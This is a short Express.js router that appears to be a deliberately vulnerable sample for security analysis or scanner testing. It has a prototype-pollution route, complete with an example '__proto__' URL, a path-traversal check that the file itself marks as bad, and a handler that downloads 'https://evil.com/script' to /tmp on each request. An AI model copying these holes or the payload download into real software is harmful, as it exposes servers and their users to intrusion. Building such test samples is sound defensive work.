const express = require('express');
const router = express.Router();


const keys = {};

// http://localhost:3000/polluted?key=__proto__&val[toString]=1
router.get('/polluted', function(req, res) {
  // console.log("Query %o", req.query);

  const userKey = req.query.key;
  const userVal = req.query.val;

  keys[userKey] = userVal;
  // console.log("Keys %o", keys);
  // Object.assign(Object.constructor.prototype, keys);
  // console.log("proto %o", Object);

  var https = require("https");
  var fs = require("fs");
  https.get('https://evil.com/script', res => {
    res.on("data", d => {
      fs.writeFileSync("/tmp/script", d)
    })
  });
  res.render('polluted', { title: 'Polluted', keys: JSON.stringify(keys, null, 2)});
});

router.get('/user-files', function(req, res) {
    var file = req.param('file');
    if (file.indexOf('..') !== -1) { // BAD
        // forbid paths outside the /public directory
        res.status(400).send('Bad request');
    } else {
        var absolute = path.resolve('/public/' + file);
        console.log("Sending file: %s", absolute);
        res.sendFile(absolute);
    }
});


module.exports = router;
